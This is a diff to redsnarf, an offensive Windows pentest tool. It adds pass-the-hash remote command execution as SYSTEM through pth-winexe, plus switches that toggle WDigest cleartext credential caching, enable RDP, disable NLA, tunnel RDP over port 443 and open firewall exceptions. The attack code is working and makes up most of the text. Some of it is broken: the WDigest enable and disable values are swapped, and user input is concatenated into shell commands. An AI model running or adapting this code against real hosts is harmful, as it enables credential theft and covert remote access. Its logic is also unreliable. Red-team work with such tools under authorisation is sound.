@@ -3,7 +3,7 @@
 # https://github.com/nccgroup/redsnarf
 # Released under Apache V2 see LICENCE for more information
 
-import os, argparse, signal, sys, re, binascii, subprocess
+import os, argparse, signal, sys, re, binascii, subprocess, string
 
 try:
 	from IPy import IP
@@ -247,7 +247,15 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]mimi_creddump.txt file not found",'red')       
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
+
 						
+			if xcommand!='n':
+				try:
+					print colored("[+]Running Command: "+xcommand,'green')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
+				except:
+					print colored("[-]Something went wrong ...",'red')
+
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
 		sys.exit()
@@ -402,7 +410,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("Simple example usage: ./%prog -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2c")
+p = argparse.ArgumentParser("Simple example usage: ./%prog -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2d")
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="administrator",help="Enter a username")
 p.add_argument("-p", "--password", dest="password", default="Password01", help="Enter a password or hash")
@@ -422,8 +430,13 @@ p.add_argument("-M", "--massmimi_dump", dest="massmimi_dump", default="n", help=
 p.add_argument("-a", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
 p.add_argument("-F", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
 p.add_argument("-f", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
-
 p.add_argument("-L", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
+p.add_argument("-x", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+p.add_argument("-R", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> Enable/Disable/Query RDP Status")
+p.add_argument("-r", "--edq_nla", dest="edq_nla", default="n", help="<Optional> Enable/Disable/Query NLA Status")
+p.add_argument("-t", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> Enable/Disable/Query Tunnel RDP out of port 443")
+p.add_argument("-W", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> Enable/Disable/Query Wdigest UseLogonCredential Registry Setting")
+
 
 args = p.parse_args()
 
@@ -448,8 +461,13 @@ massmimi_dump=args.massmimi_dump
 service_accounts=args.service_accounts
 find_user=args.find_user
 ofind_user=args.ofind_user
-
 lat=args.lat
+xcommand=args.xcommand
+edq_rdp=args.edq_rdp
+edq_nla=args.edq_nla
+edq_trdp=args.edq_trdp
+edq_wdigest=args.edq_wdigest
+
 
 if lat in yesanswers:
 	WriteLAT()
@@ -496,6 +514,180 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+if edq_wdigest!='n':
+	if len(targets)==1:
+		try:
+			if edq_wdigest=='e':
+				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling Wdigest:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null")
+
+				print colored("[+]Querying the status of NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
+
+				sys.exit()	
+
+			elif edq_wdigest=='d':
+				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
+				
+				print colored("[+]Disabling Wdigest:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null")
+
+				print colored("[+]Querying the status of Wdigest:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
+
+				sys.exit()	
+	
+			elif edq_wdigest=='q':
+				print colored("[+]Querying the status of Wdigest:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
+
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+
+if edq_nla!='n':
+	if len(targets)==1:
+		try:
+			if edq_nla=='e':
+				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 1' 2>/dev/null")
+
+				print colored("[+]Querying the status of NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+
+				sys.exit()	
+
+			elif edq_nla=='d':
+				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
+				
+				print colored("[+]Disabling NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 0' 2>/dev/null")
+
+				print colored("[+]Querying the status of NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+
+				sys.exit()	
+	
+			elif edq_nla=='q':
+				print colored("[+]Querying the status of NLA:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+
+if edq_trdp!='n':
+	if len(targets)==1:
+		try:
+			if edq_trdp=='e':
+				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
+
+				print colored("[+]Setting RDP port to 443:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 443' 2>/dev/null")
+
+				print colored("[+]Restarting RDP Service:\n",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
+
+				print colored("[+]Querying the status of RDP Port:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+
+				sys.exit()	
+
+			elif edq_trdp=='d':
+				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
+
+				print colored("[+]Setting RDP to default port of 3389:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 3389' 2>/dev/null")
+
+				print colored("[+]Restarting RDP Service:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
+
+				print colored("[+]Querying the status of RDP Port:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+
+				sys.exit()	
+	
+			elif edq_trdp=='q':
+				print colored("[+]Querying the status of RDP Port:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+
+
+if edq_rdp!='n':
+	if len(targets)==1:
+		try:
+			if edq_rdp=='e':
+				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling RDP:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")
+
+				print colored("[+]Starting RDP Service:\n",'green')
+
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")
+
+				print colored("[+]Enabling Firewall Exception:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = enable' 2>/dev/null")
+
+				print colored("[+]Querying the status of RDP:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+
+				sys.exit()	
+
+			elif edq_rdp=='d':
+				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
+
+				print colored("[+]Disabling RDP:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 1' 2>/dev/null")
+
+				print colored("[+]Stopping RDP Service:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+
+				print colored("[+]Disabling Firewall Exception:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = disable' 2>/dev/null")
+
+				print colored("[+]Querying the status of RDP:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+
+				sys.exit()	
+	
+			elif edq_rdp=='q':
+				print colored("[+]Querying the status of RDP:",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
 
 
 if drsuapi in yesanswers:
